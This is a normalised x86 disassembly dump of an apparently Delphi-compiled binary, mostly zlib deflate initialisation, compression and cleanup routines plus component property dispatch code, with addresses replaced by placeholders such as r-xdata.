mov [ eax + 0x34 ] edx
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d3d4
call sub_3a64c34
sub_3ae4cb4
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_3a65720
xor eax eax
push ebp
push sub_3ae4d27
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebx + 0x40 ]
mov eax [ ebp - 0x4 ]
call sub_3a693f4
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3ae4d2e
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
test [ ebx + 0x1c ] 0x1
jne r-xdata
lea eax [ ebx + 0x40 ]
mov edx [ ebp - 0x4 ]
call sub_3a652f4
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d3d4
call sub_3a64c34
sub_3ae4d3c
push ebx
and ecx 0x7f
cmp ecx 0x7
ja r-xdata
pop ebx
retn
jmp [ ecx * 4 + jump_table_3ae4d50 ]
cmp [ eax + 0x4a ] 0x0
je r-xdata
cmp [ eax + 0x5a ] 0x0
je r-xdata
mov [ eax + 0x30 ] 0x1
cmp [ eax + 0x52 ] 0x0
je r-xdata
mov [ eax + 0x30 ] 0x1
cmp [ eax + 0x6a ] 0x0
je r-xdata
mov [ eax + 0x30 ] 0x0
cmp [ eax + 0x62 ] 0x0
je r-xdata
cmp [ eax + 0x72 ] 0x0
je r-xdata
cmp [ eax + 0x7a ] 0x0
je r-xdata
cmp [ eax + 0x82 ] 0x0
je r-xdata
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x5c ]
call [ ebx + 0x58 ]
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x6c ]
call [ ebx + 0x68 ]
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x74 ]
call [ ebx + 0x70 ]
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x7c ]
call [ ebx + 0x78 ]
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x84 ]
call [ ebx + 0x80 ]
sub_3ae4e3c
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x8a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
sub_3ae4e68
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_3a83664
or ecx 0xffffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_3ae29dc
mov esi eax
mov [ ebx + 0x90 ] esi
mov edx esi
mov eax ebx
call sub_3ae4b58
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3ae4ec8
push ebx
push esi
call sub_3a6478c
mov ebx edx
mov esi eax
mov eax [ esi + 0x90 ]
call sub_3a64380
mov edx ebx
and dl 0xfc
mov eax esi
call sub_3a836b0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_3a64734
sub_3ae4ef8
push esi
push edi
mov esi eax
mov edi [ esi + 0x90 ]
movzx eax [ edi + 0x8 ]
cmp dl al
je r-xdata
pop edi
pop esi
retn
test [ esi + 0x1c ] 0x10
jne r-xdata
test al al
je r-xdata
mov eax [ esi + 0x40 ]
push eax
movzx eax [ esi + 0x34 ]
push eax
mov eax esi
call sub_3ae4f48
cmp al 0x1
sete al
push eax
mov ecx [ esi + 0x38 ]
mov edx [ esi + 0x3c ]
mov eax edi
call sub_3ae3350
mov edx [ edi + 0x4 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x8 ]
jmp r-xdata
sub_3ae4f60
push ebx
push esi
call sub_3a6478c
mov ebx edx
mov esi eax
mov eax [ esi + 0x90 ]
call sub_3a64380
mov edx ebx
and dl 0xfc
mov eax esi
call sub_3a836b0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_3a64734
sub_3ae4f90
push esi
push edi
mov esi eax
mov edi [ esi + 0x90 ]
movzx eax [ edi + 0x8 ]
cmp dl al
je r-xdata
pop edi
pop esi
retn
test [ esi + 0x1c ] 0x10
jne r-xdata
test al al
je r-xdata
lea eax [ esi + 0x40 ]
push eax
movzx eax [ esi + 0x34 ]
push eax
push 0x5
lea ecx [ esi + 0x38 ]
lea edx [ esi + 0x3c ]
mov eax edi
call sub_3ae4390
mov edx [ edi + 0x4 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x8 ]
jmp r-xdata
sub_3ae50d4
push ebx
mov ebx ecx
sub edx 0x1
jb r-xdata
mov eax [ eax + 0x90 ]
mov edx [ eax + 0xa0 ]
mov [ ebx ] edx
mov edx [ eax + 0xa4 ]
mov [ ebx + 0x4 ] edx
pop ebx
retn
je r-xdata
mov eax [ eax + 0x90 ]
mov edx [ eax + 0xa8 ]
mov [ ebx ] edx
mov edx [ eax + 0xac ]
mov [ ebx + 0x4 ] edx
pop ebx
retn
dec edx
je r-xdata
mov eax [ eax + 0x90 ]
mov edx [ eax + 0x90 ]
mov [ ebx ] edx
mov edx [ eax + 0x94 ]
mov [ ebx + 0x4 ] edx
pop ebx
retn
dec edx
je r-xdata
mov eax [ eax + 0x90 ]
mov edx [ eax + 0x98 ]
mov [ ebx ] edx
mov edx [ eax + 0x9c ]
mov [ ebx + 0x4 ] edx
jmp r-xdata
pop ebx
retn
sub_3ae514c
push ebp
mov ebp esp
sub edx 0x1
jb r-xdata
mov eax [ eax + 0x90 ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0xa0 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0xa4 ] edx
jmp r-xdata
je r-xdata
pop ebp
retn 0x8
mov eax [ eax + 0x90 ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0xa8 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0xac ] edx
jmp r-xdata
dec edx
je r-xdata
mov eax [ eax + 0x90 ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x90 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x94 ] edx
jmp r-xdata
dec edx
je r-xdata
mov eax [ eax + 0x90 ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x98 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x9c ] edx
jmp r-xdata
sub_3ae5200
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_3a83664
or ecx 0xffffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_3ae3e5c
mov esi eax
mov [ ebx + 0x90 ] esi
mov edx esi
mov eax ebx
call sub_3ae4b58
mov eax [ ebx + 0x90 ]
mov edx 0xa
call sub_3ae4430
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3ae547c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_3ae54d9
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi ebx
test ebx ebx
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3ae54e0
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
lea eax [ ebp - 0x4 ]
mov edx 0x2
sub edx ebx
mov edx [ edx * 4 + rw-data ]
call sub_3a65498
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d318
call sub_3a64c34
sub_3ae54e8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_3ae5545
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi ebx
test ebx ebx
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3ae554c
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
lea eax [ ebp - 0x4 ]
mov edx 0x2
sub edx ebx
mov edx [ edx * 4 + rw-data ]
call sub_3a65498
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d318
call sub_3a64c34
sub_3ae5554
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
lea eax [ ebp - 0x3c ]
xor ecx ecx
mov edx 0x38
call sub_3a63a44
mov eax ebx
mov ecx 0xa
cdq
idiv ecx
add eax ebx
add eax 0xc
add eax 0xff
and eax 0xffffff00
mov edx [ ebp + 0xc ]
mov [ edx ] eax
mov eax [ ebp + 0xc ]
mov eax [ eax ]
call sub_3a62ee0
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
xor eax eax
push ebp
push sub_3ae5668
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x3c ] esi
mov [ ebp - 0x38 ] ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov [ ebp - 0x30 ] eax
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov [ ebp - 0x2c ] eax
movzx eax [ ebp + 0x8 ]
movsx edx [ eax + rw-data ]
lea eax [ ebp - 0x3c ]
call sub_3ae544c
call sub_3ae547c
xor eax eax
push ebp
push sub_3ae5644
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
lea eax [ ebp - 0x3c ]
mov edx 0x4
call sub_3ae5c8c
call sub_3ae547c
dec eax
jne r-xdata
mov eax [ ebp + 0xc ]
add [ eax ] 0x100
mov edx [ ebp + 0xc ]
mov edx [ edx ]
mov eax [ ebp - 0x4 ]
call sub_3a62f14
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
add eax [ ebp - 0x28 ]
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x2c ] 0x100
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3ae564b
lea eax [ ebp - 0x3c ]
call sub_3ae5f10
call sub_3ae547c
retn
sub_3ae564b
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x28 ]
call sub_3a62f14
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x28 ]
mov [ eax ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_3ae568c
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov edi [ ebp + 0x8 ]
lea eax [ ebp - 0x40 ]
xor ecx ecx
mov edx 0x38
call sub_3a63a44
lea ebx [ esi + 0xff ]
and ebx 0xffffff00
test edi edi
jne r-xdata
mov eax [ ebp + 0xc ]
mov [ eax ] edi
mov eax [ ebp + 0xc ]
mov [ eax ] ebx
jmp r-xdata
lea eax [ ebp - 0x40 ]
xor edx edx
call sub_3ae6e4c
call sub_3ae54e8
dec eax
jne r-xdata
mov eax [ ebp + 0xc ]
mov eax [ eax ]
call sub_3a62ee0
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
xor eax eax
push ebp
push sub_3ae578f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x3c ] esi
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x34 ] eax
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov [ ebp - 0x30 ] eax
lea eax [ ebp - 0x40 ]
call sub_3ae5464
call sub_3ae54e8
xor eax eax
push ebp
push sub_3ae576b
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp + 0xc ]
add [ eax ] ebx
mov edx [ ebp + 0xc ]
mov edx [ edx ]
mov eax [ ebp - 0x8 ]
call sub_3a62f14
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
add eax [ ebp - 0x2c ]
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x30 ] ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3ae5772
lea eax [ ebp - 0x40 ]
call sub_3ae6cf0
call sub_3ae54e8
retn
sub_3ae5772
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x2c ]
call sub_3a62f14
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x2c ]
mov [ eax ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_3ae57d0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax [ ebp + 0xc ]
xor edx edx
test eax eax
mov [ ebp - 0xc ] edx
je r-xdata
mov eax 0xfffffffa
jmp r-xdata
mov al [ eax ]
mov ecx [ rw-data ]
cmp al [ ecx ]
jne r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x14
cmp [ ebp + 0x8 ] 0x38
je r-xdata
test esi esi
jne r-xdata
xor edx edx
mov [ esi + 0x18 ] edx
cmp [ esi + 0x20 ] 0x0
jne r-xdata
mov eax 0xfffffffe
jmp r-xdata
cmp [ esi + 0x24 ] 0x0
jne r-xdata
mov [ esi + 0x20 ] r-xdata
xor ecx ecx
mov [ esi + 0x28 ] ecx
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
mov [ esi + 0x24 ] sub_3ae541c
cmp [ ebp + 0x18 ] 0x0
jge r-xdata
mov [ ebp - 0x4 ] 0x6
cmp [ ebp + 0x14 ] 0x1
jl r-xdata
mov [ ebp - 0xc ] 0x1
neg [ ebp + 0x18 ]
mov eax 0xfffffffe
jmp r-xdata
cmp [ ebp + 0x14 ] 0x9
jg r-xdata
cmp [ ebp - 0x8 ] 0x8
jne r-xdata
cmp [ ebp + 0x18 ] 0x9
jl r-xdata
cmp [ ebp + 0x18 ] 0xf
jg r-xdata
cmp [ ebp - 0x4 ] 0x0
jl r-xdata
cmp [ ebp - 0x4 ] 0x9
jg r-xdata
cmp [ ebp + 0x10 ] 0x0
jl r-xdata
cmp [ ebp + 0x10 ] 0x2
jle r-xdata
mov ecx 0x16b8
mov edx 0x1
mov eax [ esi + 0x28 ]
call [ esi + 0x20 ]
mov ebx eax
test ebx ebx
jne r-xdata
mov [ esi + 0x1c ] ebx
mov [ ebx ] esi
mov edx [ ebp - 0xc ]
mov [ ebx + 0x18 ] edx
mov edx 0x1
mov eax [ ebp + 0x18 ]
mov ecx eax
mov [ ebx + 0x28 ] eax
shl edx cl
mov [ ebx + 0x24 ] edx
dec edx
mov [ ebx + 0x2c ] edx
mov edx 0x1
mov eax [ ebp + 0x14 ]
add eax 0x7
mov ecx eax
mov [ ebx + 0x48 ] eax
shl edx cl
mov [ ebx + 0x44 ] edx
dec edx
mov [ ebx + 0x4c ] edx
xor edx edx
mov eax [ ebx + 0x48 ]
mov ecx 0x3
add eax 0x3
dec eax
div ecx
mov [ ebx + 0x50 ] eax
mov ecx 0x2
mov eax [ esi + 0x28 ]
mov edx [ ebx + 0x24 ]
call [ esi + 0x20 ]
mov [ ebx + 0x30 ] eax
mov ecx 0x2
mov edx [ ebx + 0x24 ]
mov eax [ esi + 0x28 ]
call [ esi + 0x20 ]
mov [ ebx + 0x38 ] eax
mov ecx 0x2
mov edx [ ebx + 0x44 ]
mov eax [ esi + 0x28 ]
call [ esi + 0x20 ]
mov [ ebx + 0x3c ] eax
mov ecx [ ebp + 0x14 ]
add ecx 0x6
mov eax 0x1
shl eax cl
mov [ ebx + 0x1694 ] eax
mov ecx 0x4
mov edx eax
mov eax [ esi + 0x28 ]
call [ esi + 0x20 ]
mov [ ebx + 0x8 ] eax
mov edx [ ebx + 0x1694 ]
shl edx 0x2
mov [ ebx + 0xc ] edx
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax 0xfffffffc
jmp r-xdata
mov eax [ rw-data ]
mov [ esi + 0x18 ] eax
mov eax esi
call sub_3ae5f10
mov eax 0xfffffffc
jmp r-xdata
cmp [ ebx + 0x38 ] 0x0
je r-xdata
cmp [ ebx + 0x3c ] 0x0
je r-xdata
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov edx [ ebx + 0x1694 ]
shr edx 0x1
add edx edx
add eax edx
mov [ ebx + 0x169c ] eax
mov ecx [ ebx + 0x1694 ]
lea ecx [ ecx + ecx * 2 ]
add ecx [ ebx + 0x8 ]
mov [ ebx + 0x1690 ] ecx
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x7c ] eax
mov eax esi
mov edx [ ebp + 0x10 ]
mov [ ebx + 0x80 ] edx
mov cl [ ebp - 0x8 ]
mov [ ebx + 0x1d ] cl
call sub_3ae5ad0
sub_3ae59dc
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebp eax
xor edi edi
test ebp ebp
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov esi [ esp + 0x4 ]
je r-xdata
mov eax 0xfffffffe
jmp r-xdata
cmp [ ebp + 0x1c ] 0x0
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ esp ] 0x0
je r-xdata
mov eax [ ebp + 0x1c ]
cmp [ eax + 0x4 ] 0x2a
je r-xdata
mov ebx [ ebp + 0x1c ]
mov eax [ ebp + 0x30 ]
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
call sub_3aeb5d4
mov [ ebp + 0x30 ] eax
cmp esi 0x3
jae r-xdata
mov eax [ ebx + 0x24 ]
sub eax 0x106
cmp esi eax
jbe r-xdata
xor eax eax
jmp r-xdata
push esi
mov edx [ esp + 0x4 ]
push edx
mov ecx [ ebx + 0x30 ]
push ecx
call sub_3ae5438
mov [ ebx + 0x64 ] esi
mov [ ebx + 0x54 ] esi
mov eax [ ebx + 0x30 ]
add esp 0xc
movzx eax [ eax ]
mov [ ebx + 0x40 ] eax
mov edx [ ebx + 0x30 ]
mov ecx [ ebx + 0x50 ]
shl eax cl
movzx edx [ edx + 0x1 ]
xor eax edx
and eax [ ebx + 0x4c ]
mov [ ebx + 0x40 ] eax
xor eax eax
jmp r-xdata
mov esi eax
mov eax [ esp + 0x4 ]
sub eax esi
add [ esp ] eax
mov edx esi
sub edx 0x3
cmp eax edx
jbe r-xdata
mov ecx [ ebx + 0x50 ]
mov edx [ ebx + 0x40 ]
shl edx cl
mov ecx [ ebx + 0x30 ]
movzx ecx [ ecx + eax + 0x2 ]
xor edx ecx
and edx [ ebx + 0x4c ]
mov [ ebx + 0x40 ] edx
mov ecx [ ebx + 0x3c ]
movzx edi [ ecx + edx * 2 ]
mov edx [ ebx + 0x2c ]
and edx eax
mov ecx [ ebx + 0x38 ]
mov [ ecx + edx * 2 ] di
mov edx [ ebx + 0x3c ]
mov ecx [ ebx + 0x40 ]
mov [ edx + ecx * 2 ] ax
inc eax
test edi edi
xor eax eax
sub_3ae5ad0
push ebx
test eax eax
je r-xdata
mov eax 0xfffffffe
pop ebx
retn
cmp [ eax + 0x1c ] 0x0
je r-xdata
cmp [ eax + 0x20 ] 0x0
je r-xdata
cmp [ eax + 0x24 ] 0x0
jne r-xdata
xor edx edx
xor ecx ecx
mov [ eax + 0x14 ] edx
mov [ eax + 0x8 ] edx
mov [ eax + 0x18 ] ecx
xor edx edx
mov [ eax + 0x2c ] 0x2
mov ebx [ eax + 0x1c ]
mov [ ebx + 0x14 ] edx
mov ecx [ ebx + 0x8 ]
mov [ ebx + 0x10 ] ecx
cmp [ ebx + 0x18 ] 0x0
jge r-xdata
cmp [ ebx + 0x18 ] 0x0
je r-xdata
xor edx edx
mov [ ebx + 0x18 ] edx
mov ecx 0x2a
mov ecx 0x71
jmp r-xdata
mov [ ebx + 0x4 ] ecx
mov [ eax + 0x30 ] 0x1
xor eax eax
mov [ ebx + 0x20 ] eax
mov eax ebx
call sub_3ae9784
mov eax ebx
call sub_3ae6194
xor eax eax
pop ebx
retn
sub_3ae5b50
push ebx
push esi
push edi
push ebp
push ecx
mov edi ecx
mov ebx edx
xor edx edx
test eax eax
je r-xdata
mov eax 0xfffffffe
jmp r-xdata
cmp [ eax + 0x1c ] 0x0
jne r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov esi [ eax + 0x1c ]
cmp ebx 0xffffffff
jne r-xdata
test ebx ebx
jl r-xdata
mov ebx 0x6
mov eax 0xfffffffe
jmp r-xdata
cmp ebx 0x9
jg r-xdata
test edi edi
jl r-xdata
cmp edi 0x2
jle r-xdata
mov ecx [ esi + 0x7c ]
lea ebp [ ebx + ebx * 2 ]
lea ecx [ ecx + ecx * 2 ]
mov ecx [ ecx * 4 + rw-data ]
mov [ esp ] ecx
mov ecx [ ebp * 4 + rw-data ]
cmp ecx [ esp ]
je r-xdata
cmp ebx [ esi + 0x7c ]
je r-xdata
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov [ esi + 0x80 ] edi
mov eax edx
mov [ esi + 0x7c ] ebx
movzx eax [ ebp * 4 + rw-data ]
mov [ esi + 0x78 ] eax
movzx ecx [ ebp * 4 + rw-data ]
mov [ esi + 0x84 ] ecx
movzx eax [ ebp * 4 + rw-data ]
mov [ esi + 0x88 ] eax
movzx ecx [ ebp * 4 + rw-data ]
mov [ esi + 0x74 ] ecx
mov edx 0x1
call sub_3ae5c8c
mov edx eax
sub_3ae5c10
push ebx
mov ecx [ eax + 0x14 ]
inc [ eax + 0x14 ]
mov ebx [ eax + 0x8 ]
lea ecx [ ebx + ecx ]
push ecx
mov ecx edx
shr ecx 0x8
pop ebx
mov [ ebx ] cl
mov ecx [ eax + 0x14 ]
inc [ eax + 0x14 ]
mov eax [ eax + 0x8 ]
and dl 0xff
mov [ eax + ecx ] dl
pop ebx
retn
sub_3ae5c38
push ebx
mov ebx eax
push esi
mov eax [ ebx + 0x1c ]
mov edx [ ebx + 0x10 ]
mov esi [ eax + 0x14 ]
cmp esi edx
jbe r-xdata
test esi esi
je r-xdata
mov esi edx
pop esi
pop ebx
retn
push esi
mov eax [ eax + 0x10 ]
push eax
mov edx [ ebx + 0xc ]
push edx
call sub_3ae5438
add esp 0xc
mov eax esi
add [ ebx + 0xc ] eax
mov edx [ ebx + 0x1c ]
add [ edx + 0x10 ] eax
add [ ebx + 0x14 ] esi
sub [ ebx + 0x10 ] esi
mov eax [ ebx + 0x1c ]
mov edx [ eax + 0x14 ]
sub edx esi
mov [ eax + 0x14 ] edx
test edx edx
jne r-xdata
mov ecx [ eax + 0x8 ]
mov [ eax + 0x10 ] ecx
sub_3ae5c8c
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
test esi esi
je r-xdata
mov eax 0xfffffffe
jmp r-xdata
cmp [ esi + 0x1c ] 0x0
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp edi 0x4
jg r-xdata
test edi edi
jge r-xdata
cmp [ esi + 0xc ] 0x0
mov ebx [ esi + 0x1c ]
je r-xdata
mov eax [ rw-data ]
mov [ esi + 0x18 ] eax
mov eax 0xfffffffe
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
cmp [ ebx + 0x4 ] 0x29a
jne r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ esi + 0x10 ] 0x0
jne r-xdata
cmp edi 0x4
je r-xdata
mov [ ebx ] esi
mov ebp [ ebx + 0x20 ]
mov [ ebx + 0x20 ] edi
cmp [ ebx + 0x4 ] 0x2a
jne r-xdata
mov edx [ rw-data ]
mov eax 0xfffffffb
mov [ esi + 0x18 ] edx
jmp r-xdata
cmp [ ebx + 0x14 ] 0x0
je r-xdata
mov ecx [ ebx + 0x28 ]
mov eax [ ebx + 0x7c ]
sub ecx 0x8
dec eax
shl ecx 0x4
add ecx 0x8
shl ecx 0x8
sar eax 0x1
cmp eax 0x3
jbe r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov eax esi
call sub_3ae5c38
cmp [ esi + 0x10 ] 0x0
jne r-xdata
shl eax 0x6
or ecx eax
cmp [ ebx + 0x64 ] 0x0
je r-xdata
mov eax 0x3
cmp [ ebx + 0x4 ] 0x29a
jne r-xdata
cmp ebp edi
jl r-xdata
mov [ ebx + 0x20 ] 0xffffffff
xor eax eax
jmp r-xdata
mov eax ecx
push ecx
xor edx edx
mov ecx 0x1f
div ecx
mov eax 0x1f
pop ecx
sub eax edx
add ecx eax
mov eax ebx
mov [ ebx + 0x4 ] 0x71
mov edx ecx
call sub_3ae5c10
cmp [ ebx + 0x64 ] 0x0
je r-xdata
or ecx 0x20
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
cmp edi 0x4
je r-xdata
mov [ esi + 0x30 ] 0x1
mov edx [ esi + 0x30 ]
mov eax ebx
shr edx 0x10
call sub_3ae5c10
mov edx [ esi + 0x30 ]
mov eax ebx
and edx 0xffff
call sub_3ae5c10
mov edx [ ebx + 0x7c ]
mov eax ebx
lea edx [ edx + edx * 2 ]
mov ebp [ edx * 4 + rw-data ]
mov edx edi
call ebp
mov [ esp ] eax
cmp [ esp ] 0x2
je r-xdata
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
mov edx [ rw-data ]
mov eax 0xfffffffb
mov [ esi + 0x18 ] edx
jmp r-xdata
mov edx [ rw-data ]
mov eax 0xfffffffb
mov [ esi + 0x18 ] edx
jmp r-xdata
mov [ ebx + 0x4 ] 0x29a
cmp [ esp ] 0x3
jne r-xdata
test edi edi
je r-xdata
cmp [ esi + 0x10 ] 0x0
jne r-xdata
cmp [ esp ] 0x2
jne r-xdata
cmp [ esp ] 0x0
je r-xdata
cmp edi 0x4
je r-xdata
cmp [ ebx + 0x4 ] 0x29a
je r-xdata
xor eax eax
jmp r-xdata
mov [ ebx + 0x20 ] 0xffffffff
cmp [ esp ] 0x1
jne r-xdata
cmp [ ebx + 0x18 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
cmp edi 0x1
jne r-xdata
mov edx [ esi + 0x30 ]
mov eax ebx
shr edx 0x10
call sub_3ae5c10
mov edx [ esi + 0x30 ]
mov eax ebx
and edx 0xffff
call sub_3ae5c10
mov eax esi
call sub_3ae5c38
mov [ ebx + 0x18 ] 0xffffffff
cmp [ ebx + 0x14 ] 0x0
je r-xdata
mov eax 0x1
jmp r-xdata
push 0x0
xor ecx ecx
xor edx edx
mov eax ebx
call sub_3aea8bc
cmp edi 0x3
jne r-xdata
mov eax ebx
call sub_3aea978
jmp r-xdata
mov eax 0x1
xor eax eax
jmp r-xdata
mov eax esi
call sub_3ae5c38
cmp [ esi + 0x10 ] 0x0
jne r-xdata
mov edx [ ebx + 0x3c ]
mov ecx [ ebx + 0x44 ]
mov [ edx + ecx * 2 - 0x2 ] 0x0
mov eax [ ebx + 0x44 ]
dec eax
add eax eax
push eax
push 0x0
mov edx [ ebx + 0x3c ]
push edx
call sub_3ae5424
add esp 0xc
mov [ ebx + 0x20 ] 0xffffffff
xor eax eax
jmp r-xdata
sub_3ae5f10
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
mov eax 0xfffffffe
pop esi
pop ebx
retn
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov edx [ ebx + 0x1c ]
mov esi [ edx + 0x4 ]
cmp esi 0x2a
je r-xdata
mov edx [ ebx + 0x1c ]
mov eax [ edx + 0x8 ]
test eax eax
je r-xdata
cmp esi 0x71
je r-xdata
mov edx [ ebx + 0x1c ]
mov eax [ edx + 0x3c ]
test eax eax
je r-xdata
mov edx eax
mov eax [ ebx + 0x28 ]
call [ ebx + 0x24 ]
cmp esi 0x29a
je r-xdata
mov edx [ ebx + 0x1c ]
mov eax [ edx + 0x38 ]
test eax eax
je r-xdata
mov edx eax
mov eax [ ebx + 0x28 ]
call [ ebx + 0x24 ]
mov eax 0xfffffffe
pop esi
pop ebx
retn
mov edx [ ebx + 0x1c ]
mov eax [ edx + 0x30 ]
test eax eax
je r-xdata
mov edx eax
mov eax [ ebx + 0x28 ]
call [ ebx + 0x24 ]
mov edx [ ebx + 0x1c ]
mov eax [ ebx + 0x28 ]
call [ ebx + 0x24 ]
xor edx edx
cmp esi 0x71
mov [ ebx + 0x1c ] edx
jne r-xdata
mov edx eax
mov eax [ ebx + 0x28 ]
call [ ebx + 0x24 ]
xor eax eax
mov eax 0xfffffffd
jmp r-xdata
pop esi
pop ebx
retn
sub_3ae5fb0
push ebx
push esi
push edi
push ebp
push ecx
